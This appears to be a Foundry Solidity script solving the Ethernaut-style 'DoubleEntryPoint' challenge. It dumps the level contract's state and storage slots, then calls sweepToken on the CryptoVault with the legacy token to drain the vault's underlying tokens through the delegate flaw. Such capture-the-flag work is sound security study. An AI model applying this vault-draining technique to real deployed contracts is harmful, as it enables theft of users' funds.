// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import { DoubleEntryPoint, Forta, LegacyToken, DelegateERC20, CryptoVault } from "../src/DoubleEntryPoint.sol";

contract DoubleEntryPointSolver is Script {

    DoubleEntryPoint public instance = DoubleEntryPoint(0xe0E978e08b228279184167C55a416B6cAee2d138);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    function run() external {
        
        vm.startBroadcast(prv);
        

        console.log("||||||||||| Public Stuff |||||||||||");
        console.log(instance.owner());
        console.log(instance.cryptoVault());
        console.log(instance.player());
        console.log(instance.delegatedFrom());
        console.log(address(instance.forta()));


        console.log("||||||||||| known slot Stuff |||||||||||");
        for (uint256 s = 0; s < 10; s++) {
            console.logBytes32(vm.load(address(instance), bytes32(s)));
        }

        console.log("||||||||||| LegacyToken |||||||||||");


        Forta forta = Forta(instance.forta());
        LegacyToken LGT = LegacyToken(instance.delegatedFrom());
        CryptoVault cryptoVault = CryptoVault(instance.cryptoVault());


        console.log(LGT.owner());
        console.log(address(LGT.delegate()));
        console.log(address(cryptoVault.underlying()));
        
        console.logBytes32(bytes32(LGT.balanceOf(address(cryptoVault))));
        cryptoVault.sweepToken(LGT);
        // console.log(cryptoVault.sweptTokensRecipient()); 
        console.logBytes32(bytes32(LGT.balanceOf(address(cryptoVault))));
        
        // console.log("||||||||||| DelegateERC20 |||||||||||");
        // DelegateERC20 dlgt = DelegateERC20(LGT.delegate());

        // dlgt.delegateTransfer(me, 0, me);
        // create bot and set it in forta 

        vm.stopBroadcast();

    }

}

